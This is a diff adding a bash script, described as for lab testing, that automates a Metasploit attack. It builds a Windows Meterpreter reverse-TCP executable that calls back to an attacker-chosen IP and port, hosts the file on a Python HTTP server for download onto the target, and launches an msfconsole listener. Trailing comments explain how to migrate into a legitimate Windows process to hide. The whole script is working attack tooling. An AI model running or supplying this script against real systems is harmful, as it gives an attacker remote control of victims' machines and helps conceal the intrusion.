@@ -1,0 +1,45 @@
+#!bin/bash
+
+#This script write for Lab test only#
+#purpose of the script is create payload for reverse shell & create server to download the packet on the target device
+
+#you need set on the running of the script three argument : [1] - ip of attack machine , [2] - port of the attack machine , [3] - port for http server to connect & download file
+
+#check if you enter all argument when running the script 
+if [ $# -ne 3 ]; then
+  echo "Usage: $0 <arg1-IP_ATTACKER> <arg2-PORT_ATTACKER> <arg3-PORT_WEBSITE>"
+  exit 1
+fi
+
+IP_ATTACKER=$1
+PORT_ATTACKER=$2
+PORT_HTTP=$3
+
+# Check if the port of reverse shell is in use using ss
+if ss -tuln | grep -q ":$PORT_ATTACKER\b"; then
+    echo "Port for reverse shell $PORT_ATTACKER is already in use. Please choose a different port."
+    exit 1
+fi
+
+# Check if the port of website is in use using ss
+if ss -tuln | grep -q ":$PORT_HTTP\b"; then
+    echo "Port for WEBSITE $PORT_HTTP is already in use. Please choose a different port."
+    exit 1
+fi
+
+
+# Create TCP REVERSE SHELL PAYLOAD For windows machine - BY Metasploit Framework
+msfvenom  -p windows/meterpreter/reverse_tcp LHOST=$IP_ATTACKER LPORT=$PORT_ATTACKER -f exe -o rev$PORT_ATTACKER.exe
+echo "[*] - Success create file rev$PORT_ATTACKER.exe"
+
+# Create webserver with python , & We send it to background for let the script open msfconsole for listening the attacker
+python -m http.server $PORT_HTTP &
+echo "[*] - Success create HTTP Server to connect use this address : $IP_ATTACKER:$PORT_HTTP"
+# Open MSFConsole for listhening to reverese connection 
+msfconsole -x "use exploit/multi/handler ; set LHOST $IP_ATTACKER ; set LPORT $PORT_ATTACKER ; set payload windows/meterpreter/reverse_tcp ; run"
+
+#After get meterpreter use this commands:
+#use migrate <pid-reverse-exe> -P <pid-windows-real-process-to-hide-behind-it>
+#ps -ef | grep <filename>
+#netstat -anob ( show you proccess and port and file )
+
